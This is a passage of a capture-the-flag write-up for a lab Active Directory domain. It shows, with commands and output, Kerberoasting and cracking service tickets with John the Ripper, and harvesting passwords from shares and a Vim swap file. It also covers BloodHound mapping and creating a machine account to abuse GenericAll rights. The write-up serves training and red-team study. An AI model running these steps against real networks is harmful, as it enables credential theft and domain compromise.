+LDAP        10.5.10.10      389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=Service Accounts,CN=Users,DC=antennae,DC=rv, pwdLastSet: 2025-08-28 15:16:58.149076, lastLogon: 2025-08-30 07:37:42.373093
+LDAP        10.5.10.10      389    DC01             $krb5tgs$23$*svc_sql$ANTENNAE.RV$antennae.rv\svc_sql*$a66fad26fc10f1372475[...snip...]0eace690f78af8994cc2d7338f0bbc79ee152ab5cb6
+</code></pre></div></div>
+
+<p>Next, we can attempt to crack these service tickets using <a href="https://www.openwall.com/john/">John the Ripper</a> with the <a href="https://weakpass.com/wordlists/rockyou.txt">rockyou.txt</a> wordlist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ john --wordlist=/usr/share/wordlists/rockyou.txt service_tickets.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tr4v15           (?)     
+</code></pre></div></div>
+
+<p>We get a hit on one of the service tickets, after trying the password for both <code class="language-plaintext highlighter-rouge">svc_vdi</code> and <code class="language-plaintext highlighter-rouge">svc_sql</code>, we find that the cracked password <code class="language-plaintext highlighter-rouge">tr4v15</code> belongs to the <code class="language-plaintext highlighter-rouge">svc_vdi</code> account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15'                                            
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\svc_vdi:tr4v15
+</code></pre></div></div>
+
+<h3 id="roasting-the-hard-way">Roasting (The Hard Way)</h3>
+
+<p>We can explicitly request a service ticket for <code class="language-plaintext highlighter-rouge">TERMSRV/vdi.antennae.rv</code> using <code class="language-plaintext highlighter-rouge">kinit</code> and <code class="language-plaintext highlighter-rouge">kvno</code>, which are part of the <a href="https://web.mit.edu/kerberos/">Kerberos</a> suite of tools. Firstly, we need to grab a <code class="language-plaintext highlighter-rouge">Ticket Granting Ticket (TGT)</code> for <code class="language-plaintext highlighter-rouge">chloe.lim</code> using <code class="language-plaintext highlighter-rouge">kinit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ echo 'BZCJsopuOPgH' | kinit 'chloe.lim'@ANTENNAE.RV
+Password for chloe.lim@ANTENNAE.RV: 
+
+~$ klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: chloe.lim@ANTENNAE.RV
+
+Valid starting       Expires              Service principal
+09/07/2025 08:45:27  09/07/2025 18:45:27  krbtgt/ANTENNAE.RV@ANTENNAE.RV
+        renew until 09/08/2025 08:45:27
+</code></pre></div></div>
+
+<p>We can then use <code class="language-plaintext highlighter-rouge">kvno</code> to request a service ticket for <code class="language-plaintext highlighter-rouge">TERMSRV/vdi.antennae.rv</code>, which will be added to our existing ticket cache:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ kvno TERMSRV/vdi.antennae.rv
+TERMSRV/vdi.antennae.rv@ANTENNAE.RV: kvno = 2
+
+~$ klist                       
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: chloe.lim@ANTENNAE.RV
+
+Valid starting       Expires              Service principal
+09/07/2025 08:45:27  09/07/2025 18:45:27  krbtgt/ANTENNAE.RV@ANTENNAE.RV
+        renew until 09/08/2025 08:45:27
+09/07/2025 08:46:21  09/07/2025 18:45:27  TERMSRV/vdi.antennae.rv@ANTENNAE.RV
+        renew until 09/08/2025 08:45:27
+</code></pre></div></div>
+
+<p>In order to extract the service ticket from our ticket cache, we can use <code class="language-plaintext highlighter-rouge">describeTicket.py</code> from the <a href="https://github.com/fortra/impacket">Impacket</a> toolkit which exposes the <code class="language-plaintext highlighter-rouge">kerberoast_from_ccache</code> functionality:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/fortra/impacket/blob/master/examples/describeTicket.py#L684
+</span><span class="k">def</span> <span class="nf">kerberoast_from_ccache</span><span class="p">(</span><span class="n">decodedTGS</span><span class="p">,</span> <span class="n">spn</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
+    <span class="p">...</span>
+    <span class="k">if</span> <span class="n">decodedTGS</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'etype'</span><span class="p">]</span> <span class="o">==</span> <span class="n">constants</span><span class="p">.</span><span class="n">EncryptionTypes</span><span class="p">.</span><span class="n">rc4_hmac</span><span class="p">.</span><span class="n">value</span><span class="p">:</span>
+    <span class="n">entry</span> <span class="o">=</span> <span class="s">'$krb5tgs$%d$*%s$%s$%s*$%s$%s'</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">constants</span><span class="p">.</span><span class="n">EncryptionTypes</span><span class="p">.</span><span class="n">rc4_hmac</span><span class="p">.</span><span class="n">value</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">spn</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'~'</span><span class="p">),</span>
+        <span class="n">hexlify</span><span class="p">(</span><span class="n">decodedTGS</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'cipher'</span><span class="p">][:</span><span class="mi">16</span><span class="p">].</span><span class="n">asOctets</span><span class="p">()).</span><span class="n">decode</span><span class="p">(),</span>
+        <span class="n">hexlify</span><span class="p">(</span><span class="n">decodedTGS</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'cipher'</span><span class="p">][</span><span class="mi">16</span><span class="p">:].</span><span class="n">asOctets</span><span class="p">()).</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>In this case, the <code class="language-plaintext highlighter-rouge">enc-part-&gt;cipher</code> field contains the service ticket which is encrypted with the service account’s password. We can run <code class="language-plaintext highlighter-rouge">describeTicket.py</code> and pipe the output to <code class="language-plaintext highlighter-rouge">john</code> for cracking.</p>
+
+<blockquote>
+  <p>If you want to learn more about how Kerberos works, check out our <a href="https://github.com/ASYNC-Security/W200-Preview-Public?tab=readme-ov-file#kerberoasting">public preview</a> of our W200 course.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py /tmp/krb5cc_1000
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 2
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : c6a42e5645c02296b49b5e3b26610ce07537f383ba7e26066d28c4f8af03e7f3
+[*] User Name                     : chloe.lim
+[*] User Realm                    : ANTENNAE.RV
+[*] Service Name                  : krbtgt/ANTENNAE.RV
+[*] Service Realm                 : ANTENNAE.RV
+[*] Start Time                    : 07/09/2025 08:45:27 AM
+[*] End Time                      : 07/09/2025 18:45:27 PM
+[*] RenewTill                     : 08/09/2025 08:45:27 AM
+[*] Flags                         : (0xe10000) renewable, initial, pre_authent, enc_pa_rep
+[*] KeyType                       : aes256_cts_hmac_sha1_96
+[*] Base64(key)                   : xqQuVkXAIpa0m147JmEM4HU384O6fiYGbSjE+K8D5/M=
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/ANTENNAE.RV
+[*]   Service Realm               : ANTENNAE.RV
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 9ee0acdda8247fecc421ed5751706835
+[*] User Name                     : chloe.lim
+[*] User Realm                    : ANTENNAE.RV
+[*] Service Name                  : TERMSRV/vdi.antennae.rv
+[*] Service Realm                 : ANTENNAE.RV
+[*] Start Time                    : 07/09/2025 08:46:21 AM
+[*] End Time                      : 07/09/2025 18:45:27 PM
+[*] RenewTill                     : 08/09/2025 08:45:27 AM
+[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : nuCs3agkf+zEIe1XUXBoNQ==
+[*] Kerberoast hash               : $krb5tgs$23$*USER$ANTENNAE.RV$TERMSRV/vdi.antennae.rv*$f7a2c6216c08a17845806011049566b3$5[...snip...]0b6146b1e037b0fc3f81037ccc0260dd022ab44d39351b95027b1a57f400bb7f536a14a96e3e74e94ba
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : TERMSRV/vdi.antennae.rv
+[*]   Service Realm               : ANTENNAE.RV
+[*]   Encryption type             : rc4_hmac (etype 23)
+[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied
+</code></pre></div></div>
+
+<p>This “Kerberoast hash” can then be piped to <code class="language-plaintext highlighter-rouge">john</code>, like we did before, to crack the password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ describeTicket.py /tmp/krb5cc_1000 | grep 'Kerberoast hash' | awk '{print $5}' | tee service_tickets.txt
+~$ john --wordlist=/usr/share/wordlists/rockyou.txt service_tickets.txt      
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tr4v15           (?)     
+1g 0:00:00:01 DONE (2025-09-07 08:55) 0.8474g/s 2630Kp/s 2630Kc/s 2630KC/s trabajadorasocial24..tr0ydawn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<blockquote>
+  <p>Some tools may attempt to <em>downgrade</em> the encryption type of the service ticket to <code class="language-plaintext highlighter-rouge">rc4_hmac</code> which may be a point of detection. Using <code class="language-plaintext highlighter-rouge">kinit</code> and <code class="language-plaintext highlighter-rouge">kvno</code> ensures that the service ticket is requested with the service account’s actual encryption type. See: <a href="https://trustedsec.com/blog/art_of_kerberoast">The Art of Detecting Kerberoast Attacaks</a>.</p>
+</blockquote>
+
+<h2 id="path-2-cross-forest-enumeration">Path 2: Cross-Forest Enumeration</h2>
+
+<p>Another way of obtaining the credentials for <code class="language-plaintext highlighter-rouge">svc_vdi</code> is through enumeration of the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain, which has a <a href="https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust">two-way trust relationship</a> with the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain.</p>
+
+<p>We can identify this trust relationship by querying the <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code> domain controller for its trusted domains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --query "(objectClass=trustedDomain)" "cn flatName trustDirection trustType"
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=backward.rv,CN=System,DC=antennae,DC=rv
+LDAP        10.5.10.10      389    DC01             cn                   backward.rv
+LDAP        10.5.10.10      389    DC01             trustDirection       3
+LDAP        10.5.10.10      389    DC01             trustType            2
+LDAP        10.5.10.10      389    DC01             flatName             backward
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">trustDirection</code> attribute indicates the direction of the trust relationship:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">1</code>: One-way incoming trust</li>
+  <li><code class="language-plaintext highlighter-rouge">2</code>: One-way outgoing trust</li>
+  <li><code class="language-plaintext highlighter-rouge">3</code>: Two-way trust</li>
+</ul>
+
+<p>The presence of a <code class="language-plaintext highlighter-rouge">trustDirection</code> value of <code class="language-plaintext highlighter-rouge">3</code> confirms that there is a two-way trust relationship between the <code class="language-plaintext highlighter-rouge">antennae.rv</code> and <code class="language-plaintext highlighter-rouge">backward.rv</code> domains - this means that users from either domain can access resources in the other domain.</p>
+
+<p>We can verify this by attempting to authenticate to the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain controller <code class="language-plaintext highlighter-rouge">dc02.backward.rv</code> using the credentials for <code class="language-plaintext highlighter-rouge">chloe.lim@antennae.rv</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' -d 'antennae.rv'
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:antennae.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+</code></pre></div></div>
+
+<p>With this trust relationship in place, we can enumerate the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain for open and accessible shares. We’ll find that on the <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code> machine, we have access to the <code class="language-plaintext highlighter-rouge">antennae.rv</code> and <code class="language-plaintext highlighter-rouge">Public</code> shares.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb srv01.backward.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' -d 'antennae.rv' --shares
+SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.13      445    SRV01            [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+SMB         10.5.10.13      445    SRV01            [*] Enumerated shares
+SMB         10.5.10.13      445    SRV01            Share           Permissions     Remark
+SMB         10.5.10.13      445    SRV01            -----           -----------     ------
+SMB         10.5.10.13      445    SRV01            ADMIN$                          Remote Admin
+SMB         10.5.10.13      445    SRV01            antennae.rv     READ            Shared folder for users in antennae.rv
+SMB         10.5.10.13      445    SRV01            backward.rv                     Shared folder for users in backward.rv
+SMB         10.5.10.13      445    SRV01            C$                              Default share
+SMB         10.5.10.13      445    SRV01            IPC$            READ            Remote IPC
+SMB         10.5.10.13      445    SRV01            Public          READ,WRITE      Shared folder for users in both antennae.rv and backward.rv
+</code></pre></div></div>
+
+<p>We can loot the <code class="language-plaintext highlighter-rouge">Public</code> share, and find a file called <code class="language-plaintext highlighter-rouge">note.txt</code> that contains the credentials for the <code class="language-plaintext highlighter-rouge">svc_vdi</code> account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ smbclient.py 'chloe.lim':'BZCJsopuOPgH'@srv01.backward.rv                           
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Public
+# ls
+drw-rw-rw-          0  Sun Sep  7 09:03:04 2025 .
+drw-rw-rw-          0  Sat Aug 30 04:36:43 2025 ..
+-rw-rw-rw-          0  Sat Aug 30 04:36:19 2025 .empty
+-rw-rw-rw-        181  Sat Aug 30 04:36:19 2025 note.txt
+-rw-rw-rw-         21  Sat Aug 30 04:36:19 2025 README.md
+# cat note.txt
+@Jolene, here are the creds for svc_vdi as you asked for earlier.
+
+Not sure why you need them anymore cuz our VDI project got canned last week, but whatever.
+
+svc_vdi
+tr4v15
+</code></pre></div></div>
+
+<h2 id="looting-shares">Looting Shares</h2>
+
+<p>After obtaining access to <code class="language-plaintext highlighter-rouge">svc_vdi</code>, we can use these credentials to re-enumerate shares on <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code> to look for any interesting files. We’ll find that we have read access to the <code class="language-plaintext highlighter-rouge">service-home</code> share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15' --shares
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\svc_vdi:tr4v15 
+SMB         10.5.10.10      445    DC01             [*] Enumerated shares
+SMB         10.5.10.10      445    DC01             Share           Permissions     Remark
+SMB         10.5.10.10      445    DC01             -----           -----------     ------
+SMB         10.5.10.10      445    DC01             ADMIN$                          Remote Admin
+SMB         10.5.10.10      445    DC01             C$                              Default share
+SMB         10.5.10.10      445    DC01             IPC$            READ            Remote IPC
+SMB         10.5.10.10      445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.5.10.10      445    DC01             service-home    READ            Shared folder for services provisioned in antennae.rv
+SMB         10.5.10.10      445    DC01             SYSVOL          READ            Logon server share 
+</code></pre></div></div>
+
+<p>In this share, we’ll find <code class="language-plaintext highlighter-rouge">flag1.txt</code> which contains the first flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ smbclient.py 'svc_vdi':'tr4v15'@dc01.antennae.rv         
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+uType help for list of commands
+# use service-home
+# ls
+drw-rw-rw-          0  Sat Aug 30 08:15:51 2025 .
+drw-rw-rw-          0  Sat Aug 30 04:36:57 2025 ..
+-rw-rw-rw-         78  Sat Aug 30 04:37:04 2025 .env.sample.horizon
+-rw-rw-rw-      12289  Sat Aug 30 04:37:04 2025 .env.swp
+-rw-rw-rw-       1284  Sat Aug 30 04:37:04 2025 Connect-Horizon.ps1
+-rw-rw-rw-        925  Sat Aug 30 04:37:04 2025 Deploy-DesktopPool.ps1
+-rw-rw-rw-         62  Sat Aug 30 08:15:51 2025 flag1.txt
+# cat flag1.txt
+RV{roAStIn6_1IkE_n0_7OMOrroW_e8cac89a3efd99b6c843857ac8faa276}
+# 
+</code></pre></div></div>
+
+<h1 id="flag-2-access-uncontrolled">Flag 2: Access (Un)controlled</h1>
+
+<p><img src="/assets/img/rv-sept/2.png" alt="" /></p>
+
+<p>Based on the description of the challenge, we’ll know that the next flag requires us to obtain local access to the <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> machine. This need not be administrative access, as it is mentioned that the flag can be read by all local users.</p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">service-home</code> share, we find a <code class="language-plaintext highlighter-rouge">.env.swp</code> file, which is a <a href="https://vi.stackexchange.com/questions/177/what-is-the-purpose-of-swap-files">Vim swap file</a>. A quick google search reveals that: <code class="language-plaintext highlighter-rouge">Swap files store changes you've made to the buffer. If Vim or your computer crashes, they allow you to recover those changes.</code>. You may also find that after opening a file in <code class="language-plaintext highlighter-rouge">vim</code>, a <code class="language-plaintext highlighter-rouge">.&lt;filename&gt;.swp</code> file is created in the same directory.</p>
+
+<p>We can “recover” the contents of this swap file using the <code class="language-plaintext highlighter-rouge">vim -r</code> command, and find that it contains credentials for the <code class="language-plaintext highlighter-rouge">jolene.ong</code> user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ vim -r .env.swp
+:w .env.swp.recv
+
+~$ cat .env.swp.recv      
+HORIZON_SERVER=broker.antennae.rv
+HORIZON_USER=jolene.ong
+HORIZON_PASS=BoXALrqvqPd3
+</code></pre></div></div>
+
+<p>We can verify that these credentials are valid by attempting to authenticate to the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain controller <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3'                                                                            
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+</code></pre></div></div>
+
+<p>At this point, we can run a <a href="https://github.com/SpecterOps/BloodHound">bloodhound</a> collector to begin mapping out the Active Directory environment. We can use 
+<a href="https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce">bloodhound-ce-python</a> for this.</p>
+
+<blockquote>
+  <p>Note that this could have been done earlier as well, but was not necessary for capturing the first flag.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodhound-ce-python -u 'jolene.ong' -p 'BoXALrqvqPd3' -d 'antennae.rv' -c 'All' -ns '10.5.10.10' --zip
+INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: antennae.rv
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.antennae.rv
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc01.antennae.rv
+INFO: Found 22 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 3 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SQL01.antennae.rv
+INFO: Querying computer: DC01.antennae.rv
+INFO: Done in 00M 04S
+INFO: Compressing output into 20250907091433_bloodhound.zip
+</code></pre></div></div>
+
+<p>Following the <a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart">BloodHound Documentation</a>, we can ingest the resulting <code class="language-plaintext highlighter-rouge">zip</code> file into <code class="language-plaintext highlighter-rouge">BloodHound</code> and begin analyzing the data.</p>
+
+<p><img src="/assets/img/rv-sept/bhce.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">BloodHound</code>’s path-finding feature, we can identify that <code class="language-plaintext highlighter-rouge">jolene.ong</code> is a member of the <code class="language-plaintext highlighter-rouge">Development</code> group which has some <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/ace"><code class="language-plaintext highlighter-rouge">Access Control Entries (ACEs)</code></a> on the <code class="language-plaintext highlighter-rouge">senior-developers</code> and <code class="language-plaintext highlighter-rouge">intern-developers</code> group.</p>
+
+<h2 id="identifying-privileged-groups">Identifying Privileged Groups</h2>
+
+<p>We can take the “easy” route and simply abuse both of these ACEs and add ourselves to both groups, which will ultimately lead us in the right direction. However, you may want to take a more methodical approach and identify which of these groups is more “privileged”.</p>
+
+<p>Firstly, we can use <code class="language-plaintext highlighter-rouge">jolene.ong</code>’s credentials to re-enumerate the open shares in <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, and find that we have read access to the <code class="language-plaintext highlighter-rouge">Tools</code> share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb sql01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' --shares
+SMB         10.5.10.11      445    SQL01            [*] Windows Server 2022 Build 20348 x64 (name:SQL01) (domain:antennae.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.11      445    SQL01            [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+SMB         10.5.10.11      445    SQL01            [*] Enumerated shares
+SMB         10.5.10.11      445    SQL01            Share           Permissions     Remark
+SMB         10.5.10.11      445    SQL01            -----           -----------     ------
+SMB         10.5.10.11      445    SQL01            ADMIN$                          Remote Admin
+SMB         10.5.10.11      445    SQL01            C$                              Default share
+SMB         10.5.10.11      445    SQL01            IPC$            READ            Remote IPC
+SMB         10.5.10.11      445    SQL01            Tools           READ            Shared folder for tools
+</code></pre></div></div>
+
+<p>Inside the <code class="language-plaintext highlighter-rouge">Tools</code> share, we find a file called <code class="language-plaintext highlighter-rouge">test-connection.ps1</code> which contains a script that attempts to connect to the <code class="language-plaintext highlighter-rouge">SSH</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ smbclient.py 'jolene.ong':'BoXALrqvqPd3'@sql01.antennae.rv
+Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use tools
+# ls
+drw-rw-rw-          0  Sat Aug 30 04:37:19 2025 .
+drw-rw-rw-          0  Sat Aug 30 04:37:13 2025 ..
+-rw-rw-rw-        854  Sat Aug 30 04:37:19 2025 test-connection.ps1
+# cat test-connection.ps1
+Import-Module Posh-SSH
+
+$user = 'danish.hakim'
+$host = 'sql01.antennae.rv'
+$port = 22
+
+$securePass = Read-Host "Enter SSH password for $user@$host" -AsSecureString
+
+$creds = New-Object System.Management.Automation.PSCredential($user, $securePass)
+
+try {
+    $session = New-SSHSession `
+        -ComputerName $host `
+        -Port $port `
+        -Credential $creds `
+        -AcceptKey:$true
+
+    if ($session -and $session.SessionId) {
+        $result = Invoke-SSHCommand -SessionId $session.SessionId -Command 'hostname'
+        $result.Output.Trim()
+
+        Remove-SSHSession -SessionId $session.SessionId | Out-Null
+        Write-Host "goodbye" -ForegroundColor Green
+    }
+    else {
+        Write-Host "err: failed to establish SSH session." -ForegroundColor Red
+    }
+}
+catch {
+    Write-Host "err: $($_.Exception.Message)" -ForegroundColor Red
+}
+# 
+</code></pre></div></div>
+
+<p>In the script, we see that the <code class="language-plaintext highlighter-rouge">danish.hakim</code> user seems to be the intended user for connecting to the <code class="language-plaintext highlighter-rouge">SSH</code> service. On <code class="language-plaintext highlighter-rouge">BloodHound</code>, we’ll find that the <code class="language-plaintext highlighter-rouge">danish.hakim</code> user is a member of the <code class="language-plaintext highlighter-rouge">senior-developers</code> group.</p>
+
+<p><img src="/assets/img/rv-sept/dhkm.png" alt="" /></p>
+
+<p>Based on this, we can reasonably conclude that the <code class="language-plaintext highlighter-rouge">senior-developers</code> group <em>may</em> have <code class="language-plaintext highlighter-rouge">SSH</code> access to <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>.</p>
+
+<h2 id="machineaccountquota">MachineAccountQuota</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">GenericAll</code> privilege that <code class="language-plaintext highlighter-rouge">jolene.ong</code> has on the <code class="language-plaintext highlighter-rouge">senior-developers</code> group allows her to add herself to that group, but this may be disruptive and not an attack that you want to perform in a real-world scenario without proper authorization. Instead, we can use the <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/default-workstation-numbers-join-domain"><code class="language-plaintext highlighter-rouge">MachineAccountQuota</code></a> to create a new computer account in the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain, and then add that computer account to the <code class="language-plaintext highlighter-rouge">senior-developers</code> group.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> value can be enumerated using the <code class="language-plaintext highlighter-rouge">maq</code> module from <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' -M maq                                              
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+MAQ         10.5.10.10      389    DC01             [*] Getting the MachineAccountQuota
+MAQ         10.5.10.10      389    DC01             MachineAccountQuota: 10
+</code></pre></div></div>
+
+<p>The default value for <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> is <code class="language-plaintext highlighter-rouge">10</code>, which means that any authenticated user can create up to <code class="language-plaintext highlighter-rouge">10</code> computer accounts in the domain. We can use the <code class="language-plaintext highlighter-rouge">nxc</code> tool to create a new computer account called <code class="language-plaintext highlighter-rouge">gatari$</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd'
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
+ADD-COMP... 10.5.10.10      445    DC01             Successfully added the machine account: "gatari$" with Password: "P@ssw0rd"
+</code></pre></div></div>
+
+<h2 id="abusing-genericall-on-group">Abusing GenericAll on Group</h2>
+
+<p>This new computer account can then be used to authenticate to the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain controller <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'                                                           
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\gatari$:P@ssw0rd 
+</code></pre></div></div>
+
